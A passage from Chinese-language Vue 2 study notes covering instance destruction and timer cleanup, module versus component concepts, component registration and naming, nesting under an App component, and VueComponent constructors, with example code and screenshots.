阻止VUE启动时生成生产提示。</span><br>    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> Vue(&#123;<br>        el: <span class="hljs-string">&#x27;#root&#x27;</span>,<br>        data: &#123;<br>            opacity: <span class="hljs-number">1</span><br>        &#125;, <br>        mounted () &#123;<br>            <span class="hljs-built_in">this</span>.timer = <span class="hljs-built_in">setInterval</span>( <span class="hljs-function">() =&gt;</span> &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.opacity &lt;= <span class="hljs-number">0</span>) <span class="hljs-built_in">this</span>.opacity = <span class="hljs-number">1</span><br>                    <span class="hljs-built_in">this</span>.opacity -= <span class="hljs-number">0.01</span><br>                &#125;, <span class="hljs-number">10</span>)<br>        &#125;,<br>        methods:&#123;<br>            stop () &#123;<br>                <span class="hljs-built_in">clearInterval</span>(<span class="hljs-built_in">this</span>.timer)<br>            &#125;<br>        &#125;<br>        <br>    &#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>但是这样的停止较为温柔，只是停掉了定时器，可以通过其他手段改变<code>opacity</code>。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/52.gif" srcset="/img/loading.gif" lazyload alt="52" style="zoom:80%;" />

<p>点击按钮后，<code>opacity</code>改变引起页面变化，说明响应式还在。</p>
<p>暴力停止：使之无法改变页面标签透明度</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914214730832.png" srcset="/img/loading.gif" lazyload alt="image-20210914214730832" style="zoom:80%;" />

<p>注意：虽然销毁了<code>vm</code>，但是定时器没有关闭！</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914214933909.png" srcset="/img/loading.gif" lazyload alt="image-20210914214933909" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/53.gif" srcset="/img/loading.gif" lazyload alt="53" style="zoom:80%;" />

<p>所以，完美的代码应该是:</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914215310829.png" srcset="/img/loading.gif" lazyload alt="image-20210914215310829" style="zoom: 67%;" />

<p>注意：关闭计时器的思路，特别适合<code>vm</code>被“他杀”的情况。</p>
<hr>
<ul>
<li><p>常用的生命周期钩子：</p>
<ul>
<li><code>mounted</code>：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】</li>
<li><code>beforeDestroy</code>：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】</li>
</ul>
</li>
<li><p>关于销毁<code>Vue</code>实例：</p>
<ul>
<li>销毁后借助<code>Vue</code>开发工具看不到任何信息</li>
<li>销毁后自定义事件会失效，但是原生DOM事件仍然有效！！！</li>
<li>一般不会在<code>beforeDestroy</code>中操作数据，因为即便操作数据，再也不会触发更新流程了</li>
</ul>
</li>
</ul>
<h2 id="第二章-Vue组件化编程"><a href="#第二章-Vue组件化编程" class="headerlink" title="第二章 Vue组件化编程"></a>第二章 Vue组件化编程</h2><h3 id="2-1-对模块与组件的理解"><a href="#2-1-对模块与组件的理解" class="headerlink" title="2.1 对模块与组件的理解"></a>2.1 对模块与组件的理解</h3><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915131422795.png" srcset="/img/loading.gif" lazyload alt="image-20210915131422795"></p>
<p>  HTML代码不是复用。</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915131754667.png" srcset="/img/loading.gif" lazyload alt="image-20210915131754667"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915132043739.png" srcset="/img/loading.gif" lazyload alt="image-20210915132043739"></p>
<ul>
<li><p>模块：向外提供特定功能的js程序，一般就是一个js文件</p>
<p>原因：js文件很多且很复杂</p>
<p>作用：复用js，简化js编写，提高js运行效率</p>
</li>
<li><p>组件：实现应用中局部功能代码(html\css\js)和资源(mp3\mp4\ttf\……)的集合</p>
<p>原因：一个界面功能很复杂</p>
<p>作用：复用编码，简化项目编码，提高运行效率</p>
</li>
<li><p>模块化：当<strong>应用中的 js 都以模块来编写</strong>的, 那这个应用就是一个模块化的应用</p>
</li>
<li><p>组件化：当<strong>应用中的功能都是以多组件的方式来编写</strong>，那这个应用就是一个组件化应用</p>
</li>
</ul>
<h3 id="2-2-非单文件组件"><a href="#2-2-非单文件组件" class="headerlink" title="2.2 非单文件组件"></a>2.2 非单文件组件</h3><p>非单文件组件：一个文件中包含有n个组件(a.html)    ❌</p>
<p>单文件组件：一个文件中只包含有1个组件(a.vue)       ✔</p>
<h4 id="创建组件"><a href="#创建组件" class="headerlink" title="创建组件"></a>创建组件</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915163903406.png" srcset="/img/loading.gif" lazyload alt="image-20210915163903406" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915163629073.png" srcset="/img/loading.gif" lazyload alt="image-20210915163629073" style="zoom:80%;" />

<ul>
<li><p>组件定义时，一定不要写<code>el</code>配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。</p>
</li>
<li><p>data配置项不要写成对象，应该使用函数写法，返回对象的独立拷贝。（参见<code>data的两种写法</code>）</p>
<ul>
<li><p>原因：采用对象式，组件复用时，一个该组件修改了数据，会导致其他所有该组件数据发生变化</p>
</li>
<li><pre><code class="js">let test = &#123;
        a: 1,
        b: 2
      &#125;
      const x1 =test
      const x2 =test
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata"><br>  &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915165039344.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210915165039344&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br><span class="hljs-comment">* ```js</span><br>  function <span class="hljs-keyword">test</span>()&#123;<br>          <span class="hljs-keyword">return</span> &#123;<br>            a:1,<br>            b:2<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">const</span> x1 = <span class="hljs-keyword">test</span>()<br>        <span class="hljs-keyword">const</span> x2 = <span class="hljs-keyword">test</span>()<br></code></pre></td></tr></table></figure>

&lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915165320822.png&quot; alt=&quot;image-20210915165320822&quot; style=&quot;zoom:80%;&quot; /&gt;
</code></pre>
</li>
</ul>
</li>
<li><pre><code class="html">&lt;body&gt;
  &lt;!--准备一个容器--&gt;
  &lt;div id=&quot;root&quot;&gt;
    &lt;school&gt;&lt;/school&gt;
    &lt;hr /&gt;
    &lt;student&gt;&lt;/student&gt;
  &lt;/div&gt;
&lt;/body&gt;
&lt;script&gt;
  Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。

  // 创建school组件
  const school = Vue.extend(&#123;
    template: `
    &lt;div&gt;
    &lt;h2&gt;学校名称：&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;
    &lt;h2&gt;学校位置：&#123;&#123;schoolAddress&#125;&#125;&lt;/h2&gt;
    &lt;/div&gt;`,
    data() &#123;
      return &#123;
        schoolName: &#39;UESTC&#39;,
        schoolAddress: &#39;成都市成华区建设路一环路东一段&#39;,
      &#125;
    &#125;
  &#125;)

  // 创建student组件
  const student = Vue.extend(&#123;
    template: `
    &lt;div&gt;
    &lt;h2&gt;学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h2&gt;
    &lt;h2&gt;学生年龄：&#123;&#123;studentAge&#125;&#125;&lt;/h2&gt;
  &lt;/div&gt;`,
    data() &#123;
      return &#123;
        studentName: &#39;张加林&#39;,
        studentAge: 20
      &#125;
    &#125;
  &#125;)

  // 创建vm实例，注册组件（局部注册）
  new Vue(&#123;
    el: &#39;#root&#39;,
    components: &#123;
      school: school, // 组件名: 中转变量
      student: student //可以简写
    &#125;
  &#125;)
&lt;/script&gt;
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915170328213.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210915170328213&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br><span class="hljs-title">  注册由于是对象，所以可以简写：`school:</span> school` = &gt; `school`，因为它是对象键值对。<br><br>#### 组件全局注册<br><br>&lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915170931869.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210915170931869&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>由于现在只是局部注册，所以`root2`中使用`student`标签是无效的。<br><br>```js<br>  // 注册全局组件：Vue.component(组件名称, 中转量)<br>  Vue.component(&#x27;student&#x27;, student)<br><br><span class="hljs-keyword">new</span> Vue(&#123;<br><span class="hljs-title">    el:</span> &#x27;#root2&#x27;<br>&#125;)<br></code></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<h4 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h4><ul>
<li><code>Vue</code>中使用组件的三大步骤：<ul>
<li>定义组件（创建组件）</li>
<li>注册组件</li>
<li>使用组件（写组件标签）</li>
</ul>
</li>
<li>如何定义一个组件？<ul>
<li>使用<code>Vue.extend(options)</code>创建，其中<code>options</code>和<code>new Vue(options)</code>时传入的那个<code>options</code>几乎一模一样，但也有一些区别：<ul>
<li><code>el</code>不要写，因为最终所有组件都要经过一个<code>vm</code>的管理，由<code>vm</code>中的<code>el</code>决定服务于哪个容器</li>
<li>data必须写成函数，因为要避免组件复用时，数据存在引用关系</li>
</ul>
</li>
<li>备注：使用<code>template</code>可以配置组件结构</li>
</ul>
</li>
<li>如何注册组件？<ul>
<li>局部注册：<code>new Vue</code>时传入<code>components</code>配置项</li>
<li>全局注册：<code>Vue.component(&#39;组件名&#39;,组件)</code></li>
</ul>
</li>
<li>编写组件标签</li>
</ul>
<h3 id="2-3-组件编写注意点"><a href="#2-3-组件编写注意点" class="headerlink" title="2.3 组件编写注意点"></a>2.3 组件编写注意点</h3><p>推荐命名写法一：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915174054133.png" srcset="/img/loading.gif" lazyload alt="image-20210915174054133" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915174106903.png" srcset="/img/loading.gif" lazyload alt="image-20210915174106903" style="zoom:80%;" />

<p>推荐命名写法二（脚手架中使用）：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915174640238.png" srcset="/img/loading.gif" lazyload alt="image-20210915174640238"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915174615439.png" srcset="/img/loading.gif" lazyload alt="image-20210915174615439"></p>
<p>但是会报错，因为我们没有使用脚手架！</p>
<h4 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p>组件名：</p>
<ul>
<li><p>一个单词组成：</p>
<ul>
<li>写法一：首字母小写</li>
<li>写法二：首字母大写 ✔</li>
</ul>
</li>
<li><p>多个单词组成：</p>
<ul>
<li>写法一：<code>my-school</code>(kebab-case)</li>
<li>写法二：<code>MySchool</code>(CamelCase)，但是需要脚手架支持  ✔</li>
</ul>
</li>
<li><p>注意：</p>
<ul>
<li><p>组件名尽可能回避HTML标签中已有的元素名称，例如：<code>h2</code>、<code>H2</code>都不行！</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915175121197.png" srcset="/img/loading.gif" lazyload alt="image-20210915175121197" style="zoom:80%;" />
</li>
<li><p>可以使用<code>name</code>配置项指定组件在<strong>开发者工具</strong>中呈现的名字（注意：只是开发者工具！！！）</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915175333825.png" srcset="/img/loading.gif" lazyload alt="image-20210915175333825" style="zoom:80%;" />

<p>第三方组件库，大型项目开发会用到</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>组件标签：</p>
<ul>
<li><p>写法一：<code>&lt;shcool&gt;&lt;/school&gt;</code></p>
</li>
<li><p>写法二：<code>&lt;school /&gt;</code></p>
<ul>
<li><p>不使用脚手架时，<code>&lt;school/&gt;</code>会导致后续组件不能渲染</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915175810489.png" srcset="/img/loading.gif" lazyload alt="image-20210915175810489"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915175915404.png" srcset="/img/loading.gif" lazyload alt="image-20210915175915404"></p>
<p>上述问题使用脚手架即可</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>简写方式：<code>const school = Vue.extend(options)</code>可以简写为：<code>const school = options</code></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915180110215.png" srcset="/img/loading.gif" lazyload alt="image-20210915180110215" style="zoom:80%;" />

<p>上述代码表面上没有调用<code>Vue.extend</code>，但是实际上调用了，加<code>debugger</code>断点即可判断！（为了方便<code>Vue.extend</code>一般不写）</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915180257241.png" srcset="/img/loading.gif" lazyload alt="image-20210915180257241" style="zoom:80%;" />



</li>
</ul>
<h3 id="2-4-组件嵌套"><a href="#2-4-组件嵌套" class="headerlink" title="2.4 组件嵌套"></a>2.4 组件嵌套</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--准备一个容器--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">    Vue.config.productionTip = <span class="hljs-literal">false</span>;<span class="hljs-comment">// 阻止VUE启动时生成生产提示。</span></span><br><br><span class="javascript">       <span class="hljs-comment">// 创建学生组件</span></span><br><span class="javascript">       <span class="hljs-keyword">const</span> student = &#123;</span><br>        template: `<br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">studentName</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生年龄：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">studentAge</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`,</span></span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="javascript">                studentName: <span class="hljs-string">&#x27;张加林&#x27;</span>,</span><br>                studentAge: 20<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="javascript">    <span class="hljs-comment">// 创建学校组件</span></span><br><span class="javascript">    <span class="hljs-keyword">const</span> school = &#123;</span><br>        template: `<br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> `,</span></span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="javascript">                name: <span class="hljs-string">&#x27;UESTC&#x27;</span>,</span><br><span class="javascript">                address: <span class="hljs-string">&#x27;成华区&#x27;</span></span><br>            &#125;<br>        &#125;,<br><span class="javascript">        <span class="hljs-comment">// 注册组件</span></span><br>        components:&#123;<br>            student<br>        &#125;<br>    &#125;<br><span class="javascript">    <span class="hljs-keyword">new</span> Vue(&#123;</span><br><span class="javascript">        el: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="javascript">        <span class="hljs-comment">// 注册组件</span></span><br>        components: &#123;<br>            school<br>        &#125;<br>    &#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<img src="C:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210915192520071.png" srcset="/img/loading.gif" lazyload alt="image-20210915192520071" style="zoom:80%;" />

<p>后续开发中会定义<code>App</code>组件，用于管理应用中所有的组件，“它是vm之下，所有组件之上”。</p>
<img src="C:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210915193044912.png" srcset="/img/loading.gif" lazyload alt="image-20210915193044912" style="zoom: 67%;" />

<hr>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--准备一个容器--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">app</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">app</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">    Vue.config.productionTip = <span class="hljs-literal">false</span>;<span class="hljs-comment">// 阻止VUE启动时生成生产提示。</span></span><br><span class="javascript">    <span class="hljs-comment">// 创建学生组件</span></span><br><span class="javascript">    <span class="hljs-keyword">const</span> student = &#123;</span><br>        template: `<br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">studentName</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生年龄：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">studentAge</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`,</span></span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="javascript">                studentName: <span class="hljs-string">&#x27;张加林&#x27;</span>,</span><br>                studentAge: 20<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="javascript">    <span class="hljs-comment">// 创建学校组件</span></span><br><span class="javascript">    <span class="hljs-keyword">const</span> school = &#123;</span><br>        template: `<br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> `,</span></span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="javascript">                name: <span class="hljs-string">&#x27;UESTC&#x27;</span>,</span><br><span class="javascript">                address: <span class="hljs-string">&#x27;成华区&#x27;</span></span><br>            &#125;<br>        &#125;,<br><span class="javascript">        <span class="hljs-comment">// 注册组件</span></span><br>        components: &#123;<br>            student<br>        &#125;<br>    &#125;<br><span class="javascript">    <span class="hljs-comment">//创建hello组件</span></span><br><span class="javascript">    <span class="hljs-keyword">const</span> hello = &#123;</span><br>        template: `<br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>欢迎来到我的网站：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">mysite</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>    </span></span><br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br>        `,<br><span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="javascript">                mysite: <span class="hljs-string">&#x27;miketaylorjuly123.cn&#x27;</span>,</span><br>            &#125;<br>        &#125;<br>    &#125;<br><span class="javascript">    <span class="hljs-comment">// 创建app组件</span></span><br><span class="javascript">    <span class="hljs-keyword">const</span> app = &#123;</span><br>        template: `<br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">             <span class="hljs-tag">&lt;<span class="hljs-name">hello</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hello</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`,</span></span><br>        components: &#123;<br>            hello,<br>            school<br>        &#125;<br>    &#125;<br><span class="javascript">    <span class="hljs-keyword">new</span> Vue(&#123;</span><br><span class="javascript">        el: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="javascript">        <span class="hljs-comment">// 注册组件</span></span><br>        components: &#123;<br>            app<br>        &#125;<br>    &#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915194005003.png" srcset="/img/loading.gif" lazyload alt="image-20210915194005003" style="zoom:80%;" />

<h3 id="2-5-VueComponent构造函数"><a href="#2-5-VueComponent构造函数" class="headerlink" title="2.5 VueComponent构造函数"></a>2.5 VueComponent构造函数</h3><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915194905001.png" srcset="/img/loading.gif" lazyload alt="image-20210915194905001" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915194846036.png" srcset="/img/loading.gif" lazyload alt="image-20210915194846036" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915195054102.png" srcset="/img/loading.gif" lazyload alt="image-20210915195054102" style="zoom:80%;" />

<p>添加断点<code>degugger</code>可以发现<code>VueComponent</code>被调用。</p>
<ul>
<li><p>关于<code>VueComponent</code>：</p>
<ul>
<li><p><code>school</code>组件本质上是一个名为<code>VueComponent</code>的构造函数，且不是程序定义的，是<code>Vue.extend</code>生成的。</p>
</li>
<li><p>我们只需要写<code>&lt;school&gt;&lt;/school&gt;</code>或者<code>&lt;school/&gt;</code>，<code>Vue</code>解析时会帮我们创建<code>school</code>组件的实例对象。</p>
<p>即：<code>Vue</code>帮我们执行的：<code>new VueComponent(options)</code></p>
<ul>
